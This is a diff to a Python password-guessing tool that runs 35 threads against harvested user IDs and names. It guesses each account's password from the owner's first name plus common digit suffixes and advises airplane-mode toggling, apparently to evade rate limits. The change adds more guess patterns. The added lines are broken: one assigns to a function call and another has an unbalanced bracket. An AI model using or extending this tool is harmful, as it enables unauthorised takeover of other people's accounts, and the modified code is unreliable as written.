@@ -637,10 +637,10 @@ def ___metode___():
         print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
         with ThreadPoolExecutor(max_workers=35) as (hayuk):
             for user in ids:
-                uid, Name = user.split('<=>')
+                uid, lower(Name) = user.split('<=>')
                 ox = Name.split(' ')
                 if ___password___ in ['1','01']:
-                    pwx = [Name, ox[0]+'123', ox[0]+'12345']
+                    pwx = [lower(Name), ox[0]+'123', ox[0]+'12345', ox[0]+'121', ox[0]+'1234']]
                 elif ___password___ in ['2','02']:
                     pwx = [Name, ox[0]+'123', ox[0]+'1234', ox[0]+'12345', ox[0]+'123456']
                 elif ___password___ in ['3','03']:
